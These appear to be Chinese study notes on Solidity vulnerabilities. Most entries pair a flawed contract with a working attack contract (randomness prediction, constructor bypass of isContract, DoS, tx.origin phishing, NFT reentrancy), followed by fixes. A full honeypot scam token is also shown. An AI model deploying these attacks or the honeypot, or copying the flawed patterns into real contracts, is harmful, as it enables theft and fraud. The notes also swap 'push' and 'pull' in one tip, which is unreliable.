    - 伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。解决方案：
        - 使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签。
        - 多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。
        - 使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化。

### 2024.10.13

- [104-S04] 权限管理漏洞
    - 智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。两种常见的权限管理漏洞。
        - 1. 权限配置错误: 如果合约中特殊功能没有加上权限管理，那么任何人都能铸造大量代币或将合约中的资金提光。
        ```solidity
        function badMint(address to, uint amount) public { // 错误的mint函数，没有限制权限
            _mint(to, amount);
        }
        ```
        - 2. 授权检查错误: 没有在函数中检查调用者是否拥有足够的授权
        ```solidity
        function badBurn(address account, uint amount) public { // 错误的burn函数，没有限制权限
            _burn(account, amount);
        }
        ```
    - 预防方法：
        - 使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限：比如使用OnlyOwner修饰器
        ```solidity
        function goodMint(address to, uint amount) public onlyOwner { // 正确的mint函数，使用 onlyOwner 修饰器限制权限
            _mint(to, amount); 
        }
        ```
        - 在函数的逻辑中确保合约调用者拥有足够的授权
        ```solidity
        function goodBurn(address account, uint amount) public {
            if(msg.sender != account){ // 正确的burn函数，如果销毁的不是自己的代币，则会检查授权
                _spendAllowance(account, msg.sender, amount);
            }
            _burn(account, amount);
        }
        ```
- [104-S05] 整型溢出(Arithmetic Over/Under Flows),这是一个比较经典的漏洞，Solidity 0.8 版本后内置了 Safemath 库，因此很少发生。
    - 以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 uint8，只能表示 [0,255] 范围内的数字。如果给 uint8 类型变量的赋值 257，则会上溢（overflow）变为 1；如果给它赋值-1，则会下溢（underflow）变为255。
    - 漏洞例子：
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.21;

    contract Token {
        mapping(address => uint) balances;
        uint public totalSupply;

        constructor(uint _initialSupply) {
            balances[msg.sender] = totalSupply = _initialSupply;
        }
        
        function transfer(address _to, uint _value) public returns (bool) {
            unchecked{ // unchecked 关键字在代码块中临时关闭整型溢出检测
                require(balances[msg.sender] - _value >= 0);
                balances[msg.sender] -= _value; // 转太多会出错
                balances[_to] += _value;
            }
            return true;
        }
        function balanceOf(address _owner) public view returns (uint balance) {
            return balances[_owner];
        }
    }
    ```
- [104-S06] 签名重放（Signature Replay）
    - 数字签名一般有两种常见的重放攻击：
        - 普通重放：将本该使用一次的签名多次使用。
        - 跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。
    - 漏洞例子：
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.21;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "@openzeppelin/contracts/access/Ownable.sol";
    import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

    contract SigReplay is ERC20 {
        address public signer;
        constructor() ERC20("SigReplay", "Replay") {
            signer = msg.sender;
        }

        function badMint(address to, uint amount, bytes memory signature) public { // 有签名重放漏洞的铸造函数
            bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
            require(verify(_msgHash, signature), "Invalid Signer!"); // 铸造函数 badMint() 没有对 signature 查重，导致同样的签名可以多次使用，无限铸造代币
            _mint(to, amount);
        }

        function getMessageHash(address to, uint256 amount) public pure returns(bytes32){
            return keccak256(abi.encodePacked(to, amount));
        }

        function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {
            return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        }

        function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool){
            return ECDSA.recover(_msgHash, _signature) == signer;
        }
    }
    ```
    - 预防办法：
    ```solidity
    // 方法一
    mapping(address => bool) public mintedAddress;   // 记录已经mint的地址

    function goodMint(address to, uint amount, bytes memory signature) public {
        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
        require(verify(_msgHash, signature), "Invalid Signer!");
        require(!mintedAddress[to], "Already minted"); // 检查该地址是否mint过
        mintedAddress[to] = true; // 记录mint过的地址
        _mint(to, amount);
    }
    // 方法二：将 nonce （数值随每次交易递增）和 chainid （链ID）包含在签名消息中
    uint nonce;

    function nonceMint(address to, uint amount, bytes memory signature) public {
        bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));
        require(verify(_msgHash, signature), "Invalid Signer!");
        _mint(to, amount);
        nonce++;
    }
    ```

### 2024.10.14

- [104-S07] 坏随机数（Bad Randomness）
    - 由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如random()。很多项目方不得不使用链上的伪随机数生成方法，例如 blockhash() 和 keccak256() 方法。
    - 漏洞例子:
    ```solidity
    contract BadRandomness is ERC721 {
        uint256 totalSupply;
        constructor() ERC721("", ""){}
        // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
        function luckyMint(uint256 luckyNumber) external {
            uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
            require(randomNumber == luckyNumber, "Better luck next time!");
            _mint(msg.sender, totalSupply); // mint
            totalSupply++;
        }
    }
    contract Attack {
        function attackMint(BadRandomness nftAddr) external {
            // 提前计算随机数
            uint256 luckyNumber = uint256(
                keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
            ) % 100;
            // 利用 luckyNumber 攻击
            nftAddr.luckyMint(luckyNumber);
        }
    }
    ```
    - 预防方法：使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。
- [104-S08] 绕过合约检查
    - 很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。
    - 在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。
    - 漏洞例子：
    ```solidity
    contract ContractCheck is ERC20 {
        constructor() ERC20("", "") {}        
        function isContract(address account) public view returns (bool) {
            // extcodesize > 0 的地址一定是合约地址, 但是合约在构造函数时候 extcodesize 为0
            uint size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }

        function mint() public {
            require(!isContract(msg.sender), "Contract not allowed!"); // mint函数，只有非合约地址能调用（有漏洞）
            _mint(msg.sender, 100);
        }
    }

    // 利用构造函数的特点攻击
    contract NotContract {
        bool public isContract;
        address public contractCheck;

        // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
        constructor(address addr) {
            contractCheck = addr;
            isContract = ContractCheck(addr).isContract(address(this));
            // This will work
            for(uint i; i < 10; i++){
                ContractCheck(addr).mint();
            }
        }

        // 合约创建好以后，extcodesize > 0，isContract() 可以检测
        function mint() external {
            ContractCheck(contractCheck).mint();
        }
    }
    ```
    - 解决办法：使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。
- [104-S09] 拒绝服务（Denial of Service, DoS）
    - 漏洞例子：游戏开始时，玩家们调用 deposit() 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，refund()函数被调用，将 ETH 依次退款给所有玩家。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.21;
    contract DoSGame {     // 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
        bool public refundFinished;
        mapping(address => uint256) public balanceOf;
        address[] public players;

        function deposit() external payable {
            require(!refundFinished, "Game Over");
            require(msg.value > 0, "Please donate ETH");
            balanceOf[msg.sender] = msg.value;
            players.push(msg.sender);
        }

        function refund() external {
            require(!refundFinished, "Game Over");
            uint256 pLength = players.length;
            for(uint256 i; i < pLength; i++){
                address player = players[i];
                uint256 refundETH = balanceOf[player];
                (bool success, ) = player.call{value: refundETH}(""); // 如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行
                require(success, "Refund Fail!");
                balanceOf[player] = 0;
            }
            refundFinished = true;
        }

        function balance() external view returns(uint256){
            return address(this).balance;
        }
    }

    contract Attack {
        fallback() external payable{
            revert("DoS Attack!");
        }
        function attack(address gameAddr) external payable {
            DoSGame dos = DoSGame(gameAddr);
            dos.deposit{value: msg.value}();
        }
    }
    ```
    - 缓解措施：
        - 外部合约的函数调用（例如 call）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 require(success, "Refund Fail!"); 去掉，退款在单个地址失败时仍能继续运行。
        - 合约不会出乎意料的自毁。
        - 合约不会进入无限循环。
        - require 和 assert 的参数设定正确。
        - 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
        - 确保回调函数不会影响正常合约运行。
        - 确保当合约的参与者（例如 owner）永远缺席时，合约的主要业务仍能顺利运行。

<!-- Content_END -->
### 2024.10.15

- [104-S10] 貔貅合约(蜜罐代币 honeypot token)
    - 貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。
        - 恶意项目方部署貔貅代币合约。
        - 宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。
        - 项目方rug pull卷走资金。
    ```solidity
    contract HoneyPot is ERC20, Ownable { // 只能买，不能卖
        address public pair;
        constructor() ERC20("HoneyPot", "Pi Xiu") {
            address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory
            address tokenA = address(this); // 貔貅代币地址
            address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH
            (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序
            bytes32 salt = keccak256(abi.encodePacked(token0, token1));
            // calculate pair address
            pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            salt,
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
            )))));
        }

        function mint(address to, uint amount) public onlyOwner {
            _mint(to, amount);
        }

        function _update(address from,address to,uint256 amount) internal virtual override {
            if(to == pair){
                require(from == owner(), "Can not Transfer"); // 只有 owner 才能卖币
            }
            super._update(from, to, amount);
        }
    }
    ```
    - 为了绕过相关的貔貅检查，有些貔貅合约还进行了一系列的伪装：
        - 譬如对于非特权用户的转账，不会进行回滚，而是保持状态不变，表面上显示交易成功，实际上依旧没有实现用户的真实交易意图。
        - 伪造错误的事件，通过emit不存在的事件误导正在监听事件的钱包和浏览器，使其进行错误的显示，从而使用户产生错误的判断。
    - 预防方法：
        - 在区块链浏览器上（比如etherscan）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞。
        - 使用貔貅识别工具，比如 [Token Sniffer](https://tokensniffer.com/) 和 [Ave Check](https://ave.ai/check)，分低的话大概率是貔貅。
        - 看项目是否有审计报告。
        - 使用tenderly、phalcon分叉模拟卖出貔貅，如果失败则确定是貔貅代币。
- [104-S11] 抢先交易/抢跑(front-running)
    - 链上抢跑指的是搜索者或矿工通过调高gas或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而MEV是衡量这种利润的指标。在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些MEV机器人也会搜索mempool中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的swap交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。
- [104-S12] tx.origin 钓鱼攻击
    - 如果一个银行合约使用了tx.origin做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使msg.sender是攻击合约地址，但tx.origin是银行合约拥有者地址，那么转账就有可能成功。
    ```solidity
    contract Bank {
        address public owner;//记录合约的拥有者

        constructor() payable {
            owner = msg.sender;
        }

        function transfer(address payable _to, uint _amount) public 
            require(tx.origin == owner, "Not owner"); // tx.origin 可能被钓鱼！
            (bool sent, ) = _to.call{value: _amount}("");
            require(sent, "Failed to send Ether");
        }
    }

    contract Attack {
        address payable public hacker;
        Bank bank;
        constructor(Bank _bank) {
            bank = Bank(_bank);
            hacker = payable(msg.sender);
        }

        function attack() public {
            //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
            bank.transfer(hacker, address(bank).balance);
        }
    }
    ```
    - 预防措施：
        - 使用msg.sender代替tx.origin；
        - 如果一定要使用tx.origin，检验tx.origin == msg.sender；
### 2024.10.16

- [104-S13] 未检查的低级调用
    - 失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。以太坊的低级调用包括 call()，delegatecall()，staticcall()，和send()。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 false ，传递调用失败的信息。如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。
    - 最容易出错的是send()：一些合约使用 send() 发送 ETH，但是 send() 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 send() 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。 [example](https://www.kingoftheether.com/postmortem.html)
    ```solidity
    contract UncheckedBank {
        mapping (address => uint256) public balanceOf;

        function deposit() external payable {
            balanceOf[msg.sender] += msg.value;
        }

        function withdraw() external {
            uint256 balance = balanceOf[msg.sender];
            require(balance > 0, "Insufficient balance");
            balanceOf[msg.sender] = 0;
            // Unchecked low-level call
            bool success = payable(msg.sender).send(balance); // 这个函数没有检查 send() 的返回值，提款失败但余额会清零
        }

        function getBalance() external view returns (uint256) {
            return address(this).balance;
        }
    }
    ```
    - 使用以下几种方法来预防未检查低级调用的漏洞:
        - 检查低级调用的返回值；
        - 使用OpenZeppelin的[Address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol)库，封装了低级调用检查返回值功能；
- [104-S14] 操纵区块时间
- [104-S15] 操纵预言机
- [104-S16] NFT重入攻击
    - 转账NFT时并不会触发合约的fallback或receive函数，为什么会有重入风险呢？这是因为NFT标准（ERC721/ERC1155）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。
    - 漏洞：
        - ERC721
            - safeTransferFrom
            - _safeTransfer
            - _safeMint
            - _checkOnERC721Received
        - ERC1155
            - safeTransferFrom
            - _safeTransferFrom
            - safeBatchTransferFrom
            - _safeBatchTransferFrom
            - _mint
            - _mintBatch
            - _doSafeTransferAcceptanceCheck
            - _doSafeBatchTransferAcceptanceCheck
    - 漏洞例子：ERC721合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。
    ```solidity
    contract NFTReentrancy is ERC721 {
        uint256 public totalSupply;
        mapping(address => bool) public mintedAddress;
        constructor() ERC721("Reentry NFT", "ReNFT"){}

        // 铸造函数，每个用户只能铸造1个NFT
        function mint() payable external {
            require(mintedAddress[msg.sender] == false);
            totalSupply++;
            _safeMint(msg.sender, totalSupply); // 有重入漏洞
            mintedAddress[msg.sender] = true;
        }
    }

    contract Attack is IERC721Receiver{
        NFTReentrancy public nft;

        constructor(NFTReentrancy _nftAddr) {
            nft = _nftAddr;
        }
        
        function attack() external {
            nft.mint();
        }

        // ERC721的回调函数，会重复调用mint函数，铸造10个
        function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
            if(nft.balanceOf(address(this)) < 10){
                nft.mint();
            }
            return this.onERC721Received.selector;
        }
    }
    ```
    - 解决方法：检查-影响-交互模式（checks-effect-interaction）和重入锁 [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
- [104-S17] “跨服”重入攻击

